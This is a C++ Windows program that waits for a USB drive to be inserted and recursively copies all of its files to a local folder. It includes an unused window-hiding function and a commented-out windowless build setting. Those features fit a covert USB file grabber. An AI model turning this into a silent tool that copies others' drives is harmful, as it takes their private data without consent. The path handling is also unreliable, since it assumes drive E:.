#define _CRT_SECURE_NO_WARNINGS
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) 

#include<iostream>
#include<windows.h>
#include<tchar.h>
#include<string>
#include<vector>

using namespace std;

//本地用来存放拷贝过来文件的文件夹
LPCTSTR PATH = _T("D:\\desktop\\newfile");

//创建文件夹
void creatDir(LPCTSTR path) {
    bool ret = CreateDirectory(path,NULL);
    if (ret) {
        cout << "已创建新文件夹:"<<path << endl;
    }
    else{
        cout << "该文件已存在:"<<path << endl;
    }
}


//此函数在使用unicode字符集时使用
string wideCharToMultiByte(wchar_t* pWCStrKey)
{
    //第一次调用确认转换后单字节字符串的长度，用于开辟空间
    int pSize = WideCharToMultiByte(CP_OEMCP, 0, pWCStrKey, wcslen(pWCStrKey), NULL, 0, NULL, NULL);
    char* pCStrKey = new char[pSize + 1];
    //第二次调用将双字节字符串转换成单字节字符串
    WideCharToMultiByte(CP_OEMCP, 0, pWCStrKey, wcslen(pWCStrKey), pCStrKey, pSize, NULL, NULL);
    pCStrKey[pSize] = '\0';
    return pCStrKey;
}



//复制文件到某个文件夹(路径)
void copyFile(LPCTSTR path, LPCTSTR newPath) {

    

    //path:原文件路径，fullPath:新文件路径及名称
    bool bRet = CopyFile(path, newPath, true);
    //false：若新文件已存在，则覆盖
    //true：若新文件已存在就不拷贝，且CopyFile返回flase


    if (bRet) {
        cout << "已拷贝到:" << newPath << endl;
        cout << "复制成功"<<endl;
    }
    else {
        cout << "复制失败" << endl;
    }
}



//查找指定路径下的文件及其子文件
bool findfile(LPCTSTR path, LPCTSTR type) {
    //务必改为使用多字符集

    WIN32_FIND_DATA findData;
    TCHAR fullPath[MAX_PATH] = { 0 };//完整路径
    _stprintf(fullPath, _T("%s\\%s"), path, type);//格式化出一个完整的路径

    HANDLE hFind = FindFirstFile(fullPath, &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        cout << "cant find file." << endl;
        return 0;
    }

    while (1) {
        //必须新建WIN32_FIND_DATA
        WIN32_FIND_DATA tempFindData;
        int ret = FindNextFile(hFind, &tempFindData);

        if (ret == 0) {//在遍历完所有文件后ret变为0
            break;
        }


        if (tempFindData.cFileName[0] != '.') {//.文件是当前目录  ..文件夹指的是上层目录
            if (tempFindData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {//ATTRIBUTE:属性
                cout << "打开了文件夹:";
                cout << tempFindData.cFileName << endl;//打印文件名
                cout << "------------------------" << endl;//打印分割线


                //合成可以用于拷贝的文件路径
                TCHAR thisPath[MAX_PATH] = { 0 };
                string eraseEPath;//经过删除处理后的字符串

                _stprintf(thisPath, _T("%s\\%s"), path, tempFindData.cFileName);//格式化
                cout << "发现文件夹" << thisPath << endl;

                eraseEPath = thisPath;
                eraseEPath.erase(eraseEPath.find("E:\\"), sizeof("E:\\") - 1);


                //在本地也创建相应的文件夹
                TCHAR dirPath[MAX_PATH] = { 0 };
                _stprintf(dirPath, _T("%s\\%s"), PATH, eraseEPath.c_str());//合成用于创建本地文件夹的路径

                creatDir(dirPath);//调用创建函数在本地创建该文件夹

                //TCHAR szPath[MAX_PATH] = { 0 };
                _stprintf(dirPath, _T("%s\\%s"), path, tempFindData.cFileName);//合成用于遍历文件夹的路径

                findfile(dirPath, _T("*.*"));//传入新的路径 
                //第三个参数，传入该文件夹的名字
            }
            else {
                string FileName = tempFindData.cFileName;//得到文件名及其后缀(格式)
                //string FileName = wideCharToMultiByte(tempFindData.cFileName);//此语句在使用unicode字符集时使用

                //cout << "文件名:";
                //cout << tempFindData.cFileName << endl;

                //在if增加你想要的特定格式的文件
                if (1 || FileName.find(".xls") != string::npos || FileName.find(".doc") != string::npos || FileName.find(".ppt") != string::npos || FileName.find(".txt") != string::npos || FileName.find(".jpg") != string::npos || FileName.find(".png") != string::npos || FileName.find(".mp4") != string::npos) {//查找特定格式的文件


                    //合成可以用于拷贝的文件路径
                    TCHAR thisPath[MAX_PATH] = { 0 };
                    _stprintf(thisPath, _T("%s\\%s"), path, tempFindData.cFileName);//格式化
                    cout << "发现文件" << thisPath << endl;

                    //删除前面的（E:\\）便于合成新的文件夹路径
                    string eraseEPath = thisPath;
                    eraseEPath.erase(eraseEPath.find("E:\\"), sizeof("E:\\")-1);
                    //如果不在文件夹内那么将eraseEPath将为空


                    //合成带文件夹的本地路径
                    TCHAR addDirNamePath[MAX_PATH] = { 0 };
                    _stprintf(addDirNamePath, _T("%s\\%s"), PATH, eraseEPath.c_str());
                    copyFile(thisPath, addDirNamePath);
                    //第一个是原文件的路径，第二个是该电脑上用来存储的路径，第三个是直接把原来的路径和名字拿过来用
                }


            }


        }


    }

    FindClose(hFind);//关闭文件

    return 1;
}




//检测是否有U盘插入   并   返回u盘的名称
TCHAR getDrives() {
    TCHAR TDrives[MAX_PATH] = { 0 };
    int key = 0;//如果没有类型3就不结束


    while (key != 2) {
        //获取所有磁盘
        GetLogicalDriveStrings(MAX_PATH, TDrives);

        TCHAR* signal = TDrives;
        while (*signal) {//得到类型
            if (GetDriveType(signal) == 2) {
                key = GetDriveType(signal);
                cout << "检测到U盘插入" << endl;
                TCHAR drivePath = *signal;
                //cout << drivePath;//打印日志
                return drivePath;//返回U盘是哪一个盘
            }
            else{
                cout << "正在检测..." << endl;
                Sleep(250);
                system("cls");
            }
            signal += 1 + _tcslen(signal);
        }
        cout << "没有U盘插入" << endl;
        Sleep(250);
        system("cls");
    }
    
}


void getFiles() {
    TCHAR drivePath = getDrives();
    TCHAR fullPath[MAX_PATH] = { 0 };//完整路径
    _stprintf(fullPath, _T("%c:"), drivePath);//格式化
    cout << fullPath << endl;
    findfile(fullPath, _T("*.*"));
}

//隐藏窗口
void hideWindow() {
    HWND screen = GetForegroundWindow();
    if (screen) {
        ShowWindow(screen, SW_HIDE);
    }
}

int main() {
    creatDir(PATH);
    getFiles();
    
    //string a = "123456789123";
    //a.erase(a.find("123"),sizeof("123")-1);//得这样删
    //cout << a << endl;
    
}




//void findFile(LPCWSTR path) {
//
//	TCHAR czPath[MAX_PATH] = { 0 };
//	_stprintf(czPath, path);
//
//	WIN32_FIND_DATA fileData = {0};//用来存放文件属性的变量
//	
//	HANDLE hFile1= FindFirstFile(czPath, &fileData);//打开第一个文件
//	//hfile1 用于标记打开的哪个文件
//
//
//	while (1) {
//		cout << fileData.cFileName << endl;
//		int ret = FindNextFile(hFile1, &fileData);
//		//查找到最后一个文件夹时候返回0
//		if (ret == 0)break;
//	}
//
//}
//
//
//int main() {
//
//	findFile(_T("D:\\desktop\\myCode"));
//
//}




////查找指定路径下的文件及其子文件
//bool findfile(LPCTSTR path,LPCTSTR type, LPCTSTR dirName=_T("")) {
//    //务必改为使用多字符集
//
//    WIN32_FIND_DATA findData;
//    TCHAR fullPath[MAX_PATH] = { 0 };//完整路径
//    _stprintf(fullPath, _T("%s\\%s"), path, type);//格式化出一个完整的路径
//
//    HANDLE hFind = FindFirstFile(fullPath, &findData);
//
//    if (hFind == INVALID_HANDLE_VALUE) {
//        cout << "cant find file." << endl;
//        return 0;
//    }
//
//    while (1) {
//        //必须新建WIN32_FIND_DATA
//        WIN32_FIND_DATA tempFindData;
//        int ret=FindNextFile(hFind, &tempFindData);
//
//        if (ret == 0) {//在遍历完所有文件后ret变为0
//            break;
//        }
//
//
//        if (tempFindData.cFileName[0] != '.') {//.文件是当前目录  ..文件夹指的是上层目录
//            if (tempFindData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {//ATTRIBUTE:属性
//                cout << "打开了文件夹:";
//                cout << tempFindData.cFileName << endl;//打印文件名
//                cout << "------------------------" << endl;//打印分割线
//
//                //在本地也创建相应的文件夹
//                TCHAR dirPath[MAX_PATH] = { 0 };
//                _stprintf(dirPath, _T("%s\\%s"), PATH, tempFindData.cFileName);//合成用于创建本地文件夹的路径
//                creatDir(dirPath);//调用创建函数
//
//                TCHAR szPath[MAX_PATH] = { 0 };
//                _stprintf(szPath, _T("%s\\%s"), path, tempFindData.cFileName);//访问文件夹内的内容
//                findfile(szPath,_T("*.*"), tempFindData.cFileName);//传入新的路径 
//                //第三个参数，传入该文件夹的名字
//            }
//            else {
//                string FileName = tempFindData.cFileName;//得到文件名及其后缀(格式)
//                //string FileName = wideCharToMultiByte(tempFindData.cFileName);//此语句在使用unicode字符集时使用
//
//                //cout << "文件名:";
//                //cout << tempFindData.cFileName << endl;
//
//                //在if增加你想要的特定格式的文件
//                if (1||FileName.find(".xls") != string::npos||FileName.find(".doc") != string::npos || FileName.find(".ppt") != string::npos || FileName.find(".txt") != string::npos|| FileName.find(".jpg") != string::npos|| FileName.find(".png") != string::npos|| FileName.find(".mp4") != string::npos) {//查找特定格式的文件
//
//
//                    //合成可以用于拷贝的文件路径
//                    TCHAR thisPath[MAX_PATH] = { 0 };
//                    _stprintf(thisPath, _T("%s\\%s"), path, tempFindData.cFileName);//格式化
//                    cout << "发现文件" << thisPath << endl;
//
//
//                    //合成带文件夹的本地路径
//                    if (dirName != "") {//先判断是否在文件夹内
//                        TCHAR addDirNamePath[MAX_PATH] = { 0 };
//                        _stprintf(addDirNamePath, _T("%s\\%s"), PATH,dirName);
//
//                        //调用copyfile()
//                        copyFile(thisPath, addDirNamePath, tempFindData.cFileName);
//                        //第一个是原文件的路径，第二个是该电脑上用来存储的路径，第三个是直接把原来的名字拿过来用
//                    }
//                    else {
//                        //调用copyfile()
//                        copyFile(thisPath, PATH, tempFindData.cFileName);
//                        //第一个是原文件的路径，第二个是该电脑上用来存储的路径，第三个是直接把原来的名字拿过来用
//                    }
//
//                }
//                
//
//            }
//
//
//        }
//    }
//
//    FindClose(hFind);//关闭文件
//
//    return 1;
//}

////复制文件到某个文件夹(路径)
//void copyFile(LPCTSTR path, LPCTSTR newPath, LPCTSTR newName) {
//
//    TCHAR fullPath[MAX_PATH] = { 0 };//完整路径
//    _stprintf(fullPath, _T("%s\\%s"), newPath, newName);//格式化
//    cout <<"已拷贝到:" << fullPath << endl;
//    //path:原文件路径，fullPath:新文件路径及名称
//    bool bRet = CopyFile(path, fullPath, true);
//    //false：若新文件已存在，则覆盖
//    //true：若新文件已存在就不拷贝，且CopyFile返回flase
//
//
//    if (bRet) {
//        cout << "复制成功" << endl;
//    }
//    else {
//        cout << "复制失败" << endl;
//    }
//}


